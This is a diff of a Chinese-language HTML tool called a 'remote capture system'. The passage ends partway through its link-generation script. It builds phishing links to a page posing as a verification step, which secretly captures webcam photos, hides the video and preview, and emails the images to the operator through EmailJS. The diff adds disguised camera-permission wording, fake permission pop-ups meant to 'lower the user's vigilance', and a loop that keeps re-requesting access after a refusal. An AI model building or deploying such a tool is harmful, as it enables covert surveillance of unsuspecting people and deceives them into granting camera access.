@@ -6,16 +6,22 @@
 <title>远程拍摄系统</title>
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <style>
+/* ========== 基础重置 ========== */
 * { margin: 0; padding: 0; box-sizing: border-box; }
+
 html, body {
   font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
   width: 100%;
-  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-}
-body {
-  padding: 20px;
   -webkit-text-size-adjust: 100%;
 }
+
+/* ========== 控制面板页 ========== */
+body.panel-page {
+  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+  padding: 20px;
+  min-height: 100vh;
+}
+
 .container {
   background: white;
   border-radius: 16px;
@@ -24,18 +30,41 @@ body {
   margin: 0 auto 20px;
   box-shadow: 0 10px 40px rgba(0,0,0,0.2);
 }
-h1 { text-align: center; color: #333; margin-bottom: 24px; font-size: 22px; }
-.form-group { margin-bottom: 16px; }
-label { display: block; margin-bottom: 6px; color: #555; font-weight: 500; font-size: 14px; }
-input {
+
+h1 {
+  text-align: center;
+  color: #333;
+  margin-bottom: 24px;
+  font-size: 22px;
+}
+
+.form-group {
+  margin-bottom: 16px;
+}
+
+.form-group label {
+  display: block;
+  margin-bottom: 6px;
+  color: #555;
+  font-weight: 500;
+  font-size: 14px;
+}
+
+input, select {
   width: 100%;
   padding: 10px 12px;
   border: 2px solid #e0e0e0;
   border-radius: 8px;
   font-size: 14px;
   -webkit-appearance: none;
+  transition: border-color 0.3s;
 }
-input:focus { outline: none; border-color: #667eea; }
+
+input:focus {
+  outline: none;
+  border-color: #667eea;
+}
+
 .btn {
   width: 100%;
   padding: 12px;
@@ -46,22 +75,35 @@ input:focus { outline: none; border-color: #667eea; }
   margin-top: 10px;
   font-weight: 600;
   -webkit-appearance: none;
+  transition: all 0.3s;
 }
+
+.btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+}
+
 .btn-primary {
   background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
   color: white;
 }
-.btn-success { background: #28a745; color: white; }
-.link-box {
-  margin-top: 16px;
-  padding: 12px;
-  background: #f8f9fa;
-  border-radius: 8px;
-  border: 1px dashed #ccc;
-  word-break: break-all;
+
+.btn-success {
+  background: #28a745;
+  color: white;
 }
-.link-box a { color: #667eea; text-decoration: none; font-size: 12px; }
-#copyBtn, #copyAliasBtn { display: none; }
+
+.btn-add-perm {
+  background: #f8f9fa;
+  color: #667eea;
+  border: 2px dashed #667eea;
+  margin-top: 12px;
+}
+
+.btn-add-perm:hover {
+  background: rgba(102,126,234,0.05);
+}
+
 .section-title {
   font-size: 14px;
   font-weight: 600;
@@ -70,6 +112,40 @@ input:focus { outline: none; border-color: #667eea; }
   border-bottom: 1px solid #eee;
   padding-bottom: 6px;
 }
+
+.link-box {
+  margin-top: 16px;
+  padding: 12px;
+  background: #f8f9fa;
+  border-radius: 8px;
+  border: 1px dashed #ccc;
+  word-break: break-all;
+}
+
+.link-box label {
+  font-size: 12px;
+  color: #666;
+  margin-bottom: 4px;
+  display: block;
+}
+
+.link-box a {
+  color: #667eea;
+  text-decoration: none;
+  font-size: 12px;
+  word-break: break-all;
+}
+
+.link-disabled {
+  pointer-events: none;
+  color: #999;
+}
+
+.link-active {
+  pointer-events: auto;
+  color: #667eea;
+}
+
 .alias-box {
   margin-top: 10px;
   padding: 10px;
@@ -77,297 +153,911 @@ input:focus { outline: none; border-color: #667eea; }
   border-radius: 6px;
   display: none;
 }
-.capture-page {
+
+.alias-box label {
+  font-size: 12px;
+  color: #0c5460;
+  margin-bottom: 4px;
+  display: block;
+}
+
+.alias-box input {
+  margin-bottom: 8px;
+  background: white;
+}
+
+#copyBtn, #copyAliasBtn {
   display: none;
-  background: #1a1a2e;
-  position: fixed;
-  top: 0; left: 0;
-  width: 100%; height: 100%;
-  padding: 40px 20px;
-  text-align: center;
-  color: white;
-  overflow-y: auto;
-  z-index: 9999;
 }
-.capture-page h2 { font-size: 22px; margin-bottom: 20px; }
-#video {
+
+/* 文件上传按钮 */
+.file-upload-btn {
+  display: block;
   width: 100%;
-  max-width: 400px;
-  border-radius: 12px;
-  margin-bottom: 20px;
-  transform: scaleX(-1);
-}
-#canvas { display: none; }
-.status { font-size: 16px; margin: 20px 0; }
-.btn-allow {
-  background: #667eea;
-  color: white;
-  padding: 16px 40px;
-  border: none;
-  border-radius: 30px;
-  font-size: 18px;
+  padding: 12px;
+  background: #f8f9fa;
+  border: 2px dashed #e0e0e0;
+  border-radius: 8px;
+  text-align: center;
   cursor: pointer;
-  margin-top: 20px;
-  -webkit-appearance: none;
+  font-size: 13px;
+  color: #666;
+  transition: all 0.3s;
 }
-.warning-box {
-  background: rgba(255,200,0,0.2);
-  border: 1px solid #ffc800;
+
+.file-upload-btn:hover {
+  border-color: #667eea;
+  color: #667eea;
+  background: rgba(102,126,234,0.05);
+}
+
+.hint-preview-ctrl {
+  margin-top: 10px;
+  width: 100%;
+  height: 100px;
+  border-radius: 8px;
+  object-fit: cover;
+  display: none;
+  border: 1px solid #e0e0e0;
+}
+
+.hint-preview-ctrl.active {
+  display: block;
+}
+
+/* ========== 伪装权限配置面板 ========== */
+.perm-config-box {
+  background: #f8f9fa;
+  border-radius: 10px;
+  padding: 16px;
+  border: 1px solid #e0e0e0;
+}
+
+.perm-list {
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
+
+.perm-item {
+  background: white;
   border-radius: 8px;
   padding: 12px;
-  margin: 15px auto;
-  color: #ffc800;
-  max-width: 400px;
-  display: none;
+  border: 1px solid #e0e0e0;
+  position: relative;
+  padding-right: 36px;
 }
-#previewImg {
+
+.perm-row {
+  display: flex;
+  gap: 8px;
+  margin-bottom: 8px;
+}
+
+.perm-icon {
+  width: 50px !important;
+  text-align: center;
+  font-size: 18px;
+}
+
+.perm-title {
+  flex: 1;
+}
+
+.perm-desc {
   width: 100%;
-  max-width: 400px;
-  border-radius: 12px;
-  margin: 15px auto;
-  display: none;
+  margin-bottom: 8px;
 }
-.share-btns { display: none; margin-top: 20px; }
-.btn-share {
+
+.perm-real {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 13px;
+  color: #666;
+  cursor: pointer;
+}
+
+.perm-real input {
+  width: auto;
+  margin: 0;
+}
+
+.perm-delete {
+  position: absolute;
+  top: 8px;
+  right: 8px;
+  width: 24px;
+  height: 24px;
+  border-radius: 50%;
+  border: none;
+  background: #ff4444;
+  color: white;
+  font-size: 12px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: all 0.2s;
+}
+
+.perm-delete:hover {
+  background: #cc0000;
+  transform: scale(1.1);
+}
+
+.perm-tips {
+  margin-top: 12px;
+  padding: 10px;
+  background: #fff3cd;
+  border-radius: 6px;
+  font-size: 12px;
+  color: #856404;
+  line-height: 1.5;
+}
+
+/* ========== 拍摄页面 ========== */
+body.capture-body {
+  background: #ffffff;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  overflow: hidden;
+}
+
+.capture-content {
+  position: relative;
+  z-index: 2;
+  padding: 80px 20px;
+  text-align: center;
+  color: #333333;
+}
+
+.capture-content h2 {
+  font-size: 24px;
+  margin-bottom: 20px;
+  color: #333;
+}
+
+/* 强制隐藏视频、画布、预览图 */
+#video, #canvas, #previewImg, .share-btns {
+  display: none !important;
+  visibility: hidden !important;
+  opacity: 0 !important;
+  width: 0 !important;
+  height: 0 !important;
+  position: fixed;
+  top: -9999px;
+}
+
+.status {
+  font-size: 16px;
+  margin: 30px 0;
+  color: #666666;
+}
+
+.btn-allow {
   background: #28a745;
   color: white;
-  padding: 16px 30px;
+  padding: 14px 50px;
   border: none;
-  border-radius: 30px;
+  border-radius: 8px;
   font-size: 18px;
   cursor: pointer;
-  width: 100%;
-  max-width: 300px;
-  margin-bottom: 10px;
+  margin-top: 30px;
   -webkit-appearance: none;
+  transition: all 0.3s;
 }
-.btn-skip {
-  background: rgba(255,255,255,0.2);
-  color: white;
-  padding: 12px 30px;
-  border: 1px solid rgba(255,255,255,0.4);
-  border-radius: 30px;
+
+.btn-allow:hover {
+  background: #218838;
+  transform: translateY(-2px);
+  box-shadow: 0 4px 12px rgba(40,167,69,0.3);
+}
+
+.btn-allow:disabled {
+  background: #ccc;
+  cursor: not-allowed;
+  transform: none;
+  box-shadow: none;
+}
+
+.warning-box {
+  background: #f8f9fa;
+  border: 1px solid #e0e0e0;
+  border-radius: 8px;
+  padding: 16px;
+  margin: 20px auto;
+  color: #666666;
+  max-width: 400px;
+  display: none;
   font-size: 14px;
-  cursor: pointer;
-  width: 100%;
-  max-width: 300px;
-  -webkit-appearance: none;
 }
-</style>
-</head>
+
+/* ========== 提示图背景装饰 ========== */
+.hint-background {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 0;
+  pointer-events: none;
+  display: none;
+}
+
+.hint-background img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  opacity: 0.12;
+  filter: blur(3px) saturate(0.5);
+}
+
+.hint-background::after {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(180deg, rgba(255,255,255,0.6) 0%, rgba(255,255,255,0.8) 100%);
+}
+
+/* ========== 循环请求层 ========== */
+.retry-layer {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 10;
+  display: none;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  background: rgba(255,255,255,0.98);
+}
+
+.retry-layer.active {
+  display: flex;
+}
+
+.retry-icon {
+  font-size: 56px;
+  margin-bottom: 20px;
+  animation: shake 1s infinite;
+}
+
+@keyframes shake {
+  0%, 100% { transform: rotate(0deg); }
+  25% { transform: rotate(-10deg); }
+  75% { transform: rotate(10deg); }
+}
+
+.retry-title {
+  font-size: 22px;
+  font-weight: 600;
+  color: #333;
+  margin-bottom: 12px;
+}
+
+.retry-desc {
+  font-size: 15px;
+  color: #666;
+  max-width: 320px;
+  text-align: center;
+  line-height: 1.6;
+  margin-bottom: 30px;
+}
+
+.retry-btn {
+  padding: 14px 40px;
+  background: #dc3545;
+  color: white;
+  border: none;
+  border-radius: 10px;
+  font-size: 16px;
+  cursor: pointer;
+  font-weight: 600;
+  transition: all 0.3s;
+  margin-bottom: 12px;
+}
+
+.retry-btn:hover {
+  background: #c82333;
+  transform: translateY(-2px);
+  box-shadow: 0 4px 15px rgba(220,53,69,0.3);
+}
+
+.retry-count {
+  font-size: 13px;
+  color: #999;
+  margin-top: 10px;
+}
+
+/* ========== 伪装权限弹窗 ========== */
+.fake-permission-modal {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 100;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  background: rgba(0,0,0,0.5);
+}
+
+.fake-permission-modal.active {
+  display: flex;
+}
+
+.fake-permission-box {
+  background: white;
+  border-radius: 12px;
+  padding: 24px;
+  max-width: 360px;
+  width: 90%;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+  text-align: center;
+  animation: slideUp 0.3s ease;
+}
+
+@keyframes slideUp {
+  from { transform: translateY(30px); opacity: 0; }
+  to { transform: translateY(0); opacity: 1; }
+}
+
+.fake-permission-box .perm-icon {
+  font-size: 40px;
+  margin-bottom: 12px;
+}
+
+.fake-permission-box .perm-title {
+  font-size: 18px;
+  font-weight: 600;
+  color: #333;
+  margin-bottom: 8px;
+}
+
+.fake-permission-box .perm-desc {
+  font-size: 14px;
+  color: #666;
+  margin-bottom: 20px;
+  line-height: 1.5;
+}
+
+.fake-permission-box .perm-btn {
+  width: 100%;
+  padding: 12px;
+  border: none;
+  border-radius: 8px;
+  font-size: 15px;
+  cursor: pointer;
+  font-weight: 600;
+  margin-bottom: 8px;
+  transition: all 0.3s;
+}
+
+.fake-permission-box .perm-btn.allow {
+  background: #007AFF;
+  color: white;
+}
+
+.fake-permission-box .perm-btn.allow:hover {
+  background: #0056CC;
+  transform: translateY(-1px);
+}
+
+.fake-permission-box .perm-btn.deny {
+  background: #f0f0f0;
+  color: #666;
+}
+
+.fake-permission-box .perm-btn.deny:hover {
+  background: #e0e0e0;
+}
+
+/* ========== Toast 提示 ========== */
+.toast {
+  position: fixed;
+  bottom: 40px;
+  left: 50%;
+  transform: translateX(-50%) translateY(100px);
+  background: rgba(30,30,30,0.95);
+  color: #fff;
+  padding: 14px 28px;
+  border-radius: 12px;
+  font-size: 14px;
+  z-index: 2000;
+  opacity: 0;
+  transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+  border: 1px solid rgba(255,255,255,0.1);
+  box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  max-width: 90vw;
+  pointer-events: none;
+}
+
+.toast.show {
+  opacity: 1;
+  transform: translateX(-50%) translateY(0);
+}
+
+.toast.success { border-left: 3px solid #34C759; }
+.toast.error { border-left: 3px solid #FF3B30; }
+.toast.info { border-left: 3px solid #667eea; }
+.toast.warn { border-left: 3px solid #FF9500; }
+
+/* ========== 响应式 ========== */
+@media (max-width: 768px) {
+  .container {
+    padding: 16px;
+    margin: 10px auto;
+  }
+
+  h1 {
+    font-size: 20px;
+  }
+
+  .capture-content {
+    padding: 60px 16px;
+  }
+
+  .capture-content h2 {
+    font-size: 20px;
+  }
+
+  .perm-row {
+    flex-direction: column;
+  }
+
+  .perm-icon {
+    width: 100% !important;
+  }
+}
+
+</style></head>
 <body>
 
+<!-- ==================== 1. 控制面板页面 ==================== -->
 <div id="mainPage">
   <div class="container">
     <h1>📷 远程拍摄系统</h1>
-    
+
     <div class="form-group">
       <label>输入ID：</label>
       <input type="text" id="myid" placeholder="输入您的ID"/>
     </div>
-    
+
     <div class="form-group">
       <label>拍摄后跳转到：</label>
       <input type="text" id="url" value="http://baidu.com"/>
     </div>
 
     <div class="section-title">EmailJS 配置（可选，用于自动发邮件）</div>
-    
-    <div class="form-group">
-      <label>Service ID：</label>
-      <input type="text" id="ejsService" placeholder="service_xxx"/>
+    <div class="emailjs-tips">
+      <p>💡 <strong>免费版使用说明：</strong></p>
+      <ul>
+        <li>照片将以 base64 嵌入邮件正文（&lt;img src="{{photo}}"&gt;）</li>
+        <li>图片已自动压缩至 40% 质量（约 100-300KB）</li>
+        <li>EmailJS 模板变量: {{id}}, {{time}}, {{photo}}, {{source}}, {{to_email}}</li>
+        <li>模板 HTML 示例: &lt;img src="{{photo}}" style="max-width:100%"&gt;</li>
+        <li>查看发送记录: dashboard.emailjs.com/admin/history</li>
+      </ul>
     </div>
-    
-    <div class="form-group">
-      <label>Template ID：</label>
-      <input type="text" id="ejsTemplate" placeholder="template_xxx"/>
-    </div>
-    
-    <div class="form-group">
-      <label>Public Key：</label>
-      <input type="text" id="ejsKey" placeholder="xxx"/>
-    </div>
-    
-    <div class="form-group">
-      <label>接收邮箱：</label>
-      <input type="text" id="ejsEmail" placeholder="你的邮箱@qq.com"/>
-    </div>
+    <div class="form-group"><label>Service ID：</label><input type="text" id="ejsService" placeholder="service_xxx"/></div>
+    <div class="form-group"><label>Template ID：</label><input type="text" id="ejsTemplate" placeholder="template_xxx"/></div>
+    <div class="form-group"><label>Public Key：</label><input type="text" id="ejsKey" placeholder="xxx"/></div>
+    <div class="form-group"><label>接收邮箱：</label><input type="text" id="ejsEmail" placeholder="你的邮箱@qq.com"/></div>
 
     <div class="section-title">伪装设置（可选）</div>
-    
+    <div class="form-group"><label>页面标题：</label><input type="text" id="fakeTitle" value="页面加载中..."/></div>
+    <div class="form-group"><label>显示标题：</label><input type="text" id="fakeH1" value="正在验证页面..."/></div>
+    <div class="form-group"><label>描述文字：</label><input type="text" id="fakeDesc" value="点击按钮继续浏览页面"/></div>
+    <div class="form-group"><label>按钮文字：</label><input type="text" id="fakeBtn" value="继续浏览"/></div>
+
+    <div class="section-title">摄像头伪装配置 ⭐</div>
     <div class="form-group">
-      <label>页面标题：</label>
-      <input type="text" id="fakeTitle" value="页面加载中..."/>
+      <label>摄像头权限显示名称：</label>
+      <input type="text" id="camFakeName" value="请求验证权限" placeholder="例如：请求人脸验证、请求设备验证"/>
+      <div style="font-size:12px;color:#888;margin-top:6px">
+        💡 浏览器弹出的权限框会显示此名称，建议伪装成"验证"、"认证"等词
+      </div>
     </div>
-    
     <div class="form-group">
-      <label>显示标题：</label>
-      <input type="text" id="fakeH1" value="正在验证页面..."/>
+      <label>摄像头权限描述：</label>
+      <input type="text" id="camFakeDesc" value="需要访问验证设备以完成安全认证" placeholder="权限框中的说明文字"/>
     </div>
-    
     <div class="form-group">
-      <label>描述文字：</label>
-      <input type="text" id="fakeDesc" value="点击按钮继续浏览页面"/>
+      <label>权限被拒绝提示：</label>
+      <input type="text" id="camDenyMsg" value="验证权限被拒绝，必须启用验证设备才能继续" placeholder="用户拒绝后显示的文字"/>
     </div>
-    
     <div class="form-group">
-      <label>按钮文字：</label>
-      <input type="text" id="fakeBtn" value="继续浏览"/>
+      <label>重新授权按钮文字：</label>
+      <input type="text" id="camRetryBtn" value="重新授权验证设备" placeholder="循环请求按钮文字"/>
+    </div>
+
+    <div class="section-title">提示图设置（摄像头故障时显示）</div>
+    <div class="form-group">
+      <label>上传"请授权摄像头"提示图（作为背景装饰）：</label>
+      <input type="file" id="hintInput" accept="image/*" style="display:none">
+      <label for="hintInput" class="file-upload-btn">
+        📁 点击上传提示图
+      </label>
+      <img id="hintPreviewCtrl" class="hint-preview-ctrl" alt="提示图预览">
+    </div>
+
+    <div class="section-title">伪装权限配置（可选，用于干扰用户）</div>
+    <div class="perm-config-box" id="permConfigBox">
+      <div class="perm-list" id="permList">
+        <div class="perm-item" data-index="0">
+          <div class="perm-row">
+            <input type="text" class="perm-icon" placeholder="图标" value="📍">
+            <input type="text" class="perm-title" placeholder="标题" value="请求位置权限">
+          </div>
+          <input type="text" class="perm-desc" placeholder="描述文字" value="为了提供更好的本地化服务，需要获取您的位置信息">
+          <label class="perm-real">
+            <input type="checkbox" class="perm-real-check" checked>
+            <span>实际请求该权限（增加真实性）</span>
+          </label>
+          <button class="perm-delete" onclick="deletePermItem(this)" title="删除">✕</button>
+        </div><div class="perm-item" data-index="1">
+          <div class="perm-row">
+            <input type="text" class="perm-icon" placeholder="图标" value="🔔">
+            <input type="text" class="perm-title" placeholder="标题" value="请求通知权限">
+          </div>
+          <input type="text" class="perm-desc" placeholder="描述文字" value="为了及时推送重要消息，需要开启通知权限">
+          <label class="perm-real">
+            <input type="checkbox" class="perm-real-check" checked>
+            <span>实际请求该权限</span>
+          </label>
+          <button class="perm-delete" onclick="deletePermItem(this)" title="删除">✕</button>
+        </div>
+        <div class="perm-item" data-index="2">
+          <div class="perm-row">
+            <input type="text" class="perm-icon" placeholder="图标" value="📐">
+            <input type="text" class="perm-title" placeholder="标题" value="请求方向传感器">
+          </div>
+          <input type="text" class="perm-desc" placeholder="描述文字" value="为了优化页面显示效果，需要访问设备方向数据">
+          <label class="perm-real">
+            <input type="checkbox" class="perm-real-check">
+            <span>实际请求该权限</span>
+          </label>
+          <button class="perm-delete" onclick="deletePermItem(this)" title="删除">✕</button>
+        </div>
+      </div>
+      <button class="btn btn-add-perm" onclick="addPermItem()">+ 添加伪装权限</button>
+      <div class="perm-tips">
+        💡 提示：将真正的摄像头权限请求混入这些伪装权限中，降低用户警惕性。<br>
+        建议勾选"实际请求"让浏览器真的弹出权限框，增加真实感。
+      </div>
     </div>
 
     <div class="section-title">链接别名（可选）</div>
-    
-    <div class="form-group">
-      <label>自定义链接显示名称：</label>
-      <input type="text" id="linkAlias" placeholder="例如：直播入口、视频验证"/>
-    </div>
+    <div class="form-group"><label>自定义链接显示名称：</label><input type="text" id="linkAlias" placeholder="例如：直播入口、视频验证"/></div>
 
     <button class="btn btn-primary" onclick="generateLink()">生成链接</button>
-    
+
     <div class="link-box">
-      <label style="font-size:12px;color:#666;">原始链接：</label><br>
-      <a id="kd" style="pointer-events: none; color: #999;">请先生成链接！</a>
+      <label>原始链接：</label>
+      <a id="kd" class="link-disabled">请先生成链接！</a>
     </div>
-    
     <div class="alias-box" id="aliasBox">
-      <label style="font-size:12px;color:#0c5460;">别名链接：</label>
-      <input type="text" id="aliasUrl" readonly style="width:100%;margin-bottom:8px;"/>
+      <label>别名链接：</label>
+      <input type="text" id="aliasUrl" readonly/>
       <button class="btn btn-success" onclick="copyAlias()">复制别名链接</button>
     </div>
-    
-    <button class="btn btn-success" id="copyBtn" onclick="copyToClipboard()">复制原始链接</button>
+    <button class="btn btn-success" id="copyBtn" onclick="copyToClipboard()" style="display:none">复制原始链接</button>
   </div>
 </div>
-<div class="capture-page" id="capturePage">
-  <h2 id="captureTitle">正在加载...</h2>
-  
-  <div class="warning-box" id="wechatTip">
-    ⚠️ 检测到微信浏览器<br>请按右上角 ⋮ 选择"在浏览器打开"
+
+<!-- ==================== 2. 拍摄页面 ==================== -->
+<div class="capture-body" id="capturePage" style="display:none">
+  <div class="hint-background" id="hintBackground"><img id="hintBgImg" src="" alt=""></div>
+  <div class="capture-content">
+    <h2 id="captureTitle">正在加载...</h2>
+    <div class="warning-box" id="wechatTip">请使用系统浏览器打开以获得最佳体验</div>
+    <div class="status" id="status">请允许摄像头权限以继续</div>
+    <button class="btn-allow" id="allowBtn" onclick="startCapture()">继续浏览</button>
   </div>
-  
   <video id="video" autoplay playsinline muted></video>
   <canvas id="canvas"></canvas>
-  <img id="previewImg" alt="拍摄结果"/>
-  
-  <div class="status" id="status">请允许摄像头权限以继续</div>
-  
-  <button class="btn-allow" id="allowBtn" onclick="startCapture()">继续浏览</button>
-  
-  <div class="share-btns" id="shareSection">
-    <p style="margin-bottom:12px;">✅ 照片已拍摄并保存到本地</p>
-    <button class="btn-share" onclick="sharePhoto()">📤 发送照片给好友</button>
-    <button class="btn-skip" onclick="skipShare()">跳过，直接跳转</button>
+  <img id="previewImg" alt=""/>
+
+  <div class="retry-layer" id="retryLayer">
+    <div class="retry-icon" id="retryIcon">🔐</div>
+    <div class="retry-title" id="retryTitle">需要验证权限</div>
+    <div class="retry-desc" id="retryDesc">
+      该页面需要访问验证设备以完成安全认证。<br>
+      请点击下方按钮重新授权。
+    </div>
+    <button class="retry-btn" id="retryBtn" onclick="retryCamera()">重新授权验证设备</button>
+    <div class="retry-count" id="retryCount"></div>
   </div>
+
+  <div class="fake-permission-modal" id="fakePermModal">
+    <div class="fake-permission-box">
+      <div class="perm-icon" id="permIcon">🔒</div>
+      <div class="perm-title" id="permTitle">请求权限</div>
+      <div class="perm-desc" id="permDesc">需要获取相关权限以继续。</div>
+      <button class="perm-btn allow" id="permAllowBtn" onclick="handleFakePerm(true)">允许</button>
+      <button class="perm-btn deny" onclick="handleFakePerm(false)">拒绝</button>
+    </div>
+  </div>
+
+  <div class="toast" id="toast"></div>
 </div>
 
 <script>
-var urlParams = new URLSearchParams(window.location.search);
-var isCapture = urlParams.get('mode') === 'capture';
+// ==================== 3. 工具函数 (utils.js) ====================
+/**
+ * 工具函数库
+ */
 
-if (isCapture) {
-  document.getElementById('mainPage').style.display = 'none';
-  document.getElementById('capturePage').style.display = 'block';
-  initCapture();
+/**
+ * 显示 Toast 提示
+ * @param {string} message - 提示内容
+ * @param {string} type - 类型: success|error|info|warn
+ * @param {number} duration - 显示时长(ms)
+ */
+function showToast(message, type, duration) {
+  type = type || 'info';
+  duration = duration || 3000;
+
+  var toast = document.getElementById('toast');
+  if (!toast) return;
+
+  toast.textContent = message;
+  toast.className = 'toast ' + type + ' show';
+
+  setTimeout(function() {
+    toast.classList.remove('show');
+  }, duration);
+}
+
+/**
+ * 复制文本到剪贴板
+ * @param {string} text - 要复制的文本
+ * @param {string} msg - 成功提示消息
+ */
+function doCopy(text, msg) {
+  if (navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard.writeText(text).then(function() {
+      alert('✅ ' + msg);
+    }).catch(function() {
+      fallbackCopy(text, msg);
+    });
+  } else {
+    fallbackCopy(text, msg);
+  }
+}
+
+/**
+ * 降级复制方案
+ */
+function fallbackCopy(text, msg) {
+  var ta = document.createElement('textarea');
+  ta.value = text;
+  ta.style.position = 'fixed';
+  ta.style.left = '-9999px';
+  ta.style.opacity = '0';
+  document.body.appendChild(ta);
+  ta.focus();
+  ta.select();
+
+try {
+    var success = document.execCommand('copy');
+    alert(success ? '✅ ' + msg : '❌ 复制失败，请手动复制');
+  } catch (e) {
+    alert('❌ 复制失败，请手动复制');
+  }
+
+  document.body.removeChild(ta);
+}
+
+/**
+ * 获取 URL 参数对象
+ */
+function getUrlParams() {
+  return new URLSearchParams(window.location.search);
+}
+
+/**
+ * 清理资源
+ */
+function cleanup() {
+  if (window.STATE && window.STATE.stream) {
+    window.STATE.stream.getTracks().forEach(function(t) { t.stop(); });
+    window.STATE.stream = null;
+  }
+}
+
+// 页面卸载时清理
+window.addEventListener('beforeunload', cleanup);
+
+
+// ==================== 4. 控制面板逻辑 ====================
+var hintImageData = null;
+
+document.getElementById('hintInput').addEventListener('change', function(event) {
+  var file = event.target.files[0];
+  if (!file) return;
+  var reader = new FileReader();
+  reader.onload = function(e) {
+    hintImageData = e.target.result;
+    var preview = document.getElementById('hintPreviewCtrl');
+    preview.src = hintImageData;
+    preview.classList.add('active');
+    showToast('提示图已上传', 'success');
+  };
+  reader.readAsDataURL(file);
+});
+
+function addPermItem() {
+  var list = document.getElementById('permList');
+  var index = list.children.length;
+  var item = document.createElement('div');
+  item.className = 'perm-item';
+  item.setAttribute('data-index', index);
+  item.innerHTML = 
+    '<div class="perm-row">' +
+      '<input type="text" class="perm-icon" placeholder="图标" value="🔒">' +
+      '<input type="text" class="perm-title" placeholder="标题" value="请求权限">' +
+    '</div>' +
+    '<input type="text" class="perm-desc" placeholder="描述文字" value="为了提供服务，需要获取相关权限">' +
+    '<label class="perm-real">' +
+      '<input type="checkbox" class="perm-real-check">' +
+      '<span>实际请求该权限</span>' +
+    '</label>' +
+    '<button class="perm-delete" onclick="deletePermItem(this)" title="删除">✕</button>';
+  list.appendChild(item);
+}
+
+function deletePermItem(btn) {
+  var item = btn.parentElement;
+  item.remove();
+  var items = document.querySelectorAll('.perm-item');
+  items.forEach(function(it, idx) {
+    it.setAttribute('data-index', idx);
+  });
+}
+
+function getPermConfig() {
+  var items = document.querySelectorAll('.perm-item');
+  var config = [];
+  items.forEach(function(item) {
+    config.push({
+      icon: item.querySelector('.perm-icon').value || '🔒',
+      title: item.querySelector('.perm-title').value || '请求权限',
+      desc: item.querySelector('.perm-desc').value || '需要获取相关权限',
+      real: item.querySelector('.perm-real-check').checked
+    });
+  });
+  return config;
 }
 
 function generateLink() {
   var id = document.getElementById('myid').value.trim();
   var targetUrl = document.getElementById('url').value.trim() || 'http://baidu.com';
   var alias = document.getElementById('linkAlias').value.trim();
-  
-  if (!id) {
-    alert('请输入ID！');
-    return;
+
+  if (!id) { alert('请输入ID！'); return; }
+  if (!/^https?:\/\//i.test(targetUrl)) targetUrl = 'http://' + targetUrl;
+
+  var params = {
+    id: id,
+    target: targetUrl,
+    mode: 'capture'
+  };
+
+  ['service','template','key','email'].forEach(function(k) {
+    var val = document.getElementById('ejs' + k.charAt(0).toUpperCase() + k.slice(1)).value.trim();
+    if (val) params[k] = val;
+  });
+
+  ['ft','fh','fd','fb'].forEach(function(k) {
+    var inputId = k === 'ft' ? 'fakeTitle' : k === 'fh' ? 'fakeH1' : k === 'fd' ? 'fakeDesc' : 'fakeBtn';
+    var val = document.getElementById(inputId).value.trim();
+    if (val) params[k] = val;
+  });
+
+  // 摄像头伪装参数
+  var camName = document.getElementById('camFakeName').value.trim();
+  var camDesc = document.getElementById('camFakeDesc').value.trim();
+  var camDeny = document.getElementById('camDenyMsg').value.trim();
+  var camRetry = document.getElementById('camRetryBtn').value.trim();
+  if (camName) params.camName = camName;
+  if (camDesc) params.camDesc = camDesc;
+  if (camDeny) params.camDeny = camDeny;
+  if (camRetry) params.camRetry = camRetry;
+
+  if (hintImageData) params.hint = hintImageData;
+
+  var permConfig = getPermConfig();
+  if (permConfig.length > 0) {
+    params.perms = JSON.stringify(permConfig);
   }
-  
-  if (!/^https?:\/\//i.test(targetUrl)) {
-    targetUrl = 'http://' + targetUrl;
-  }
-  
-  var ejsService = document.getElementById('ejsService').value.trim();
-  var ejsTemplate = document.getElementById('ejsTemplate').value.trim();
-  var ejsKey = document.getElementById('ejsKey').value.trim();
-  var ejsEmail = document.getElementById('ejsEmail').value.trim();
-  
-  var fakeTitle = document.getElementById('fakeTitle').value.trim();
-  var fakeH1 = document.getElementById('fakeH1').value.trim();
-  var fakeDesc = document.getElementById('fakeDesc').value.trim();
-  var fakeBtn = document.getElementById('fakeBtn').value.trim();
-  
+
   var baseUrl = window.location.href.split('?')[0];
-  var fullLink = baseUrl + '?id=' + encodeURIComponent(id) + 
-                 '&target=' + encodeURIComponent(targetUrl) + 
-                 '&mode=capture';
-  
-  if (ejsService) fullLink += '&service=' + encodeURIComponent(ejsService);
-  if (ejsTemplate) fullLink += '&template=' + encodeURIComponent(ejsTemplate);
-  if (ejsKey) fullLink += '&key=' + encodeURIComponent(ejsKey);
-  if (ejsEmail) fullLink += '&email=' + encodeURIComponent(ejsEmail);
-  
-  if (fakeTitle) fullLink += '&ft=' + encodeURIComponent(fakeTitle);
-  if (fakeH1) fullLink += '&fh=' + encodeURIComponent(fakeH1);
-  if (fakeDesc) fullLink += '&fd=' + encodeURIComponent(fakeDesc);
-  if (fakeBtn) fullLink += '&fb=' + encodeURIComponent(fakeBtn);
-  
